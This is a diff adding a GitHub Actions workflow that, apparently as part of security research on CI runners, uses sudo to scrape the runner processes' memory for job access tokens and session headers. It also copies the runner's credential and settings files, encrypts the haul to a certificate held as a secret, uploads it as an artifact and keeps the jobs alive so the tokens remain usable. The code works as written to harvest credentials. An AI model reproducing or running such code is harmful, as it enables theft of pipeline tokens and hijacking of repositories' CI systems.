@@ -1,0 +1,176 @@
+name: r9r-same-run-two-job-lifecycle
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  capture-and-hold:
+    strategy:
+      fail-fast: false
+      matrix:
+        side: [A, B]
+    name: capture-and-hold-${{ matrix.side }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    env:
+      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
+      F004_JOB_CANARY: F004-SAME-RUN-${{ github.run_id }}-${{ matrix.side }}-CANARY-7a2c4f91
+      F004_SIDE: ${{ matrix.side }}
+    steps:
+      - name: Capture encrypted same-run lifecycle authority
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          test -n "$F004_CAPTURE_CERT"
+          test -n "$F004_JOB_CANARY"
+
+          raw="$RUNNER_TEMP/f004-same-run-raw"
+          sealed="$RUNNER_TEMP/f004-same-run-sealed"
+          mkdir -p "$raw/memory" "$raw/runner-diag" "$sealed"
+          sleep 20
+
+          sudo python3 - "$raw/memory" <<'PY'
+          import os
+          import pathlib
+          import re
+          import subprocess
+          import sys
+
+          output = pathlib.Path(sys.argv[1])
+          needles = [
+              b'"name": "SystemVssConnection"',
+              b'"name":"SystemVssConnection"',
+              b'"AccessToken"',
+              b'PipelinesServiceUrl',
+              b'X-Actions-Session',
+              b'run-actions-',
+              b'"planId":',
+              b'"jobId":',
+              b'renewjob',
+              b'completejob',
+          ]
+          pids = subprocess.run(
+              ['pgrep', '-f', 'Runner.Listener|Runner.Worker'],
+              capture_output=True, text=True, check=False,
+          ).stdout.split()
+          manifest = []
+          for pid_text in pids:
+              pid = int(pid_text)
+              try:
+                  comm = pathlib.Path(f'/proc/{pid}/comm').read_text().strip()
+                  maps_text = pathlib.Path(f'/proc/{pid}/maps').read_text()
+                  mem = open(f'/proc/{pid}/mem', 'rb', buffering=0)
+              except OSError as exc:
+                  manifest.append(f'{pid_text} open-error {exc}')
+                  continue
+              if 'Runner' not in comm:
+                  mem.close()
+                  continue
+              pathlib.Path(output, f'{pid}-{comm}.maps').write_text(maps_text)
+              hit_count = 0
+              seen = set()
+              with mem:
+                  for line in maps_text.splitlines():
+                      fields = line.split()
+                      if len(fields) < 2 or 'r' not in fields[1]:
+                          continue
+                      start_text, end_text = fields[0].split('-')
+                      start, end = int(start_text, 16), int(end_text, 16)
+                      if end <= start or end - start > 1024 * 1024 * 1024:
+                          continue
+                      position, overlap = start, b''
+                      while position < end and hit_count < 56:
+                          size = min(1024 * 1024, end - position)
+                          try:
+                              chunk = os.pread(mem.fileno(), size, position)
+                          except OSError:
+                              break
+                          data, base = overlap + chunk, position - len(overlap)
+                          for needle in needles:
+                              cursor = 0
+                              while hit_count < 56:
+                                  index = data.find(needle, cursor)
+                                  if index < 0:
+                                      break
+                                  absolute = base + index
+                                  key = (needle, absolute // 4096)
+                                  if key not in seen:
+                                      seen.add(key)
+                                      window_start = max(start, absolute - 131072)
+                                      window_end = min(end, absolute + 131072)
+                                      try:
+                                          window = os.pread(mem.fileno(), window_end - window_start, window_start)
+                                      except OSError:
+                                          window = b''
+                                      if window:
+                                          label = re.sub(rb'[^A-Za-z0-9]+', b'-', needle).decode().strip('-')
+                                          name = f'{pid}-{comm}-{hit_count:02d}-{label}-{absolute:x}.bin'
+                                          pathlib.Path(output, name).write_bytes(window)
+                                          manifest.append(f'{pid} {comm} {label} 0x{absolute:x} {len(window)}')
+                                          hit_count += 1
+                                  cursor = index + len(needle)
+                          overlap = data[-262144:]
+                          position += size
+                      if hit_count >= 56:
+                          break
+              manifest.append(f'{pid} {comm} total-hits {hit_count}')
+          pathlib.Path(output, 'manifest.txt').write_text('\n'.join(manifest) + '\n')
+          PY
+
+          runner_root="/home/runner/actions-runner/cached/2.337.0"
+          if sudo test -d "$runner_root/_diag"; then
+            sudo cp -a "$runner_root/_diag/." "$raw/runner-diag/"
+          fi
+          for name in .runner .agent .credentials .setup_info; do
+            if sudo test -f "$runner_root/$name"; then
+              sudo cp -a "$runner_root/$name" "$raw/$name"
+            fi
+          done
+          sudo cp -a /opt/hca/.settings "$raw/hca.settings"
+          printf '%s' "$F004_JOB_CANARY" > "$raw/JOB_CANARY.txt"
+          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
+          sudo chown -R "$USER:$USER" "$raw"
+
+          python3 - "$raw" "$sealed/metadata.json" <<'PY'
+          import hashlib, json, os, pathlib, sys
+          raw = pathlib.Path(sys.argv[1])
+          canary = os.environ['F004_JOB_CANARY'].encode()
+          captures = list((raw / 'memory').glob('*.bin'))
+          pathlib.Path(sys.argv[2]).write_text(json.dumps({
+              'repository': os.environ['GITHUB_REPOSITORY'],
+              'run_id': os.environ['GITHUB_RUN_ID'],
+              'run_attempt': os.environ['GITHUB_RUN_ATTEMPT'],
+              'job': os.environ['GITHUB_JOB'],
+              'side': os.environ['F004_SIDE'],
+              'runner_name': os.environ['RUNNER_NAME'],
+              'canary_sha256': hashlib.sha256(canary).hexdigest(),
+              'memory_capture_count': len(captures),
+              'memory_capture_bytes': sum(path.stat().st_size for path in captures),
+          }, indent=2) + '\n')
+          PY
+
+          tar -C "$raw" -cf "$RUNNER_TEMP/f004-same-run.tar" .
+          openssl cms -encrypt -binary -aes-256-cbc \
+            -in "$RUNNER_TEMP/f004-same-run.tar" \
+            -outform DER \
+            -out "$sealed/payload.cms" \
+            "$RUNNER_TEMP/f004-certificate.pem"
+          shasum -a 256 "$sealed/payload.cms" | awk '{print $1}' > "$sealed/payload.cms.sha256"
+          shred -u "$RUNNER_TEMP/f004-same-run.tar" "$RUNNER_TEMP/f004-certificate.pem"
+          sudo rm -rf "$raw"
+
+      - name: Upload ciphertext only
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-same-run-${{ matrix.side }}-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-same-run-sealed
+          retention-days: 1
+          compression-level: 0
+
+      - name: Hold both controlled jobs live
+        shell: bash
+        run: sleep 1200
